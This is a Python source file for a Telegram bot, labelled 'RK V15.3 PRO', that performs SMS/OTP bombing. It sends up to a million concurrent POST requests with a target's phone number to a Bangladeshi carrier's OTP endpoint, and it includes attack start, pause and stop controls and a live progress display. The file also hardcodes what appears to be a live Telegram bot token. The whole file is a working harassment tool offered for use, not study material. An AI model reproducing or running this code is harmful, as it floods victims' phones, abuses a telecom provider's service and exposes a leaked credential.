import asyncio
import aiohttp
import telebot
import time
import json
import os
import logging
import psutil
from telebot.async_telebot import AsyncTeleBot
from telebot import types
from aiohttp import web 
from datetime import datetime
import pytz

# --- CONFIGURATION ---
API_TOKEN = '8479817459:AAEgiLY2rnRuzsgCbD91nTzCdDMTaM_vOAs'
ADMIN_ID = 6048050987  
TARGET_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
WAKEUP_URL = "https://rkbombx.onrender.com" 
DB_FILE = "rk_users_v15.json"
SYSTEM_STATS_FILE = "rk_system_stats.json"

logging.basicConfig(level=logging.INFO)
bot = AsyncTeleBot(API_TOKEN)
TZ = pytz.timezone('Asia/Dhaka')

# Global Storage
active_attacks = {}  
user_states = {}
authorized_users = {ADMIN_ID}
global_sms_count = 0

# --- DATA PERSISTENCE ---
def load_all_data():
    global global_sms_count, authorized_users
    if os.path.exists(SYSTEM_STATS_FILE):
        try:
            with open(SYSTEM_STATS_FILE, "r") as f:
                data = json.load(f)
                global_sms_count = data.get("total_sent", 0)
        except: pass

def save_data():
    try:
        with open(SYSTEM_STATS_FILE, "w") as f:
            json.dump({"total_sent": global_sms_count}, f)
    except: pass

# --- HEALTH SERVER ---
async def handle_health(request):
    return web.Response(text="RK BOT IS ACTIVE")

async def start_server():
    app = web.Application()
    app.router.add_get('/', handle_health)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    await web.TCPSite(runner, '0.0.0.0', port).start()

# --- KEYBOARDS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 Start Attack", "📊 System Info", "📞 Support")
    return markup

def control_panel(chat_id, status):
    markup = types.InlineKeyboardMarkup(row_width=2)
    p_txt = "⏸ Pause" if status == "running" else "▶️ Resume"
    p_call = f"pau_{chat_id}" if status == "running" else f"res_{chat_id}"
    markup.add(types.InlineKeyboardButton(p_txt, callback_data=p_call),
               types.InlineKeyboardButton("⏹ Stop", callback_data=f"stp_{chat_id}"))
    return markup

# --- ENGINE ---
async def send_otp(session, number, stats):
    global global_sms_count
    try:
        async with session.post(TARGET_URL, json={"msisdn": number}, timeout=5) as resp:
            if resp.status == 200:
                stats['ok'] += 1
                global_sms_count += 1
            else: stats['err'] += 1
    except: stats['err'] += 1
    stats['total'] += 1

async def attack_logic(chat_id, message_id, target, limit):
    evt = asyncio.Event()
    evt.set()
    start_time = datetime.now(TZ)
    active_attacks[chat_id] = {'event': evt, 'status': 'running', 'stop': False}
    stats = {'ok': 0, 'err': 0, 'total': 0}
    
    async with aiohttp.ClientSession() as session:
        while stats['total'] < limit:
            if active_attacks.get(chat_id, {}).get('stop'): break
            if not evt.is_set(): await evt.wait()
            
            batch = min(40, limit - stats['total'])
            tasks = [send_otp(session, target, stats) for _ in range(batch)]
            await asyncio.gather(*tasks)
            
            try:
                prog = int((stats['total']/limit)*100)
                bar = "🔹" * (prog // 10) + "▫️" * (10 - (prog // 10))
                elapsed = int((datetime.now(TZ) - start_time).total_seconds())
                
                monitor = (
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 **Target:** `{target}`\n"
                    f"📊 **Progress:** `{prog}%` {bar}\n"
                    f"✅ **Success:** `{stats['ok']}` ]\n"
                    f"❌ **Fail:** `{stats['err']}` ]\n"
                    f"🔢 **Total Sent:** `{stats['total']}/{limit}` ]\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🕒 **Started:** `{start_time.strftime('%I:%M:%S %p')}` ]\n"
                    f"⏳ **Running_Time:** `{elapsed}s` ]\n"
                    f"📡 **STATUS:** `{active_attacks[chat_id]['status'].upper()}` ]\n"
                    f"━━━━━━━━━━━━━━━━━━━━"
                )
                await bot.edit_message_text(monitor, chat_id, message_id, 
                                          reply_markup=control_panel(chat_id, active_attacks[chat_id]['status']),
                                          parse_mode="Markdown")
            except: pass
            await asyncio.sleep(1)
            
    active_attacks.pop(chat_id, None)
    save_data()
    await bot.send_message(chat_id, f"🏁 **Attack Finished!**\nTarget: `{target}`\nSuccess: `{stats['ok']}`", reply_markup=main_menu())

# --- ALL HANDLERS (Sequential) ---

@bot.message_handler(commands=['start'])
async def start(m):
    await bot.send_message(m.chat.id, "🔥 **RK V15.3 PRO ONLINE**", reply_markup=main_menu())

@bot.message_handler(func=lambda m: True)
async def handle_all_messages(m):
    cid = m.chat.id
    text = m.text

    # মেইন মেনু চেক
    if text == "🚀 Start Attack":
        if cid != ADMIN_ID: return await bot.reply_to(m, "🚫 অনুমতি নেই!")
        user_states[cid] = {"step": "num"}
        return await bot.send_message(cid, "📞 **টার্গেট নম্বর দিন:**", reply_markup=types.ReplyKeyboardRemove())

    if text == "📊 System Info":
        return await bot.reply_to(m, f"🖥 CPU: {psutil.cpu_percent()}% | RAM: {psutil.virtual_memory().percent}%\n📨 Total: {global_sms_count}")

    # স্টেট চেক (নম্বর এবং লিমিট ইনপুট)
    if cid in user_states:
        state = user_states[cid].get("step")
        
        if state == "num":
            if len(text) == 11 and text.isdigit():
                user_states[cid] = {"step": "limit", "target": text}
                await bot.send_message(cid, "🔢 **পরিমাণ দিন (Max 1,000,000):**")
            else:
                await bot.reply_to(m, "❌ সঠিক ১১ ডিজিট নম্বর দিন।")
        
        elif state == "limit":
            if text.isdigit():
                limit = min(int(text), 1000000)
                target = user_states[cid]['target']
                user_states.pop(cid)
                msg = await bot.send_message(cid, "⚡ ইঞ্জিন শুরু হচ্ছে...")
                asyncio.create_task(attack_logic(cid, msg.message_id, target, limit))
            else:
                await bot.reply_to(m, "⚠️ শুধু সংখ্যা দিন।")

@bot.callback_query_handler(func=lambda c: True)
async def callbacks(c):
    cid = c.message.chat.id
    if cid in active_attacks:
        if c.data.startswith("pau_"):
            active_attacks[cid]['event'].clear()
            active_attacks[cid]['status'] = "paused"
        elif c.data.startswith("res_"):
            active_attacks[cid]['event'].set()
            active_attacks[cid]['status'] = "running"
        elif c.data.startswith("stp_"):
            active_attacks[cid]['stop'] = True
            active_attacks[cid]['event'].set()
    await bot.answer_callback_query(c.id)

# --- START ---
async def run():
    load_all_data()
    await asyncio.gather(start_server(), bot.polling(non_stop=True))

if __name__ == "__main__":
    asyncio.run(run())
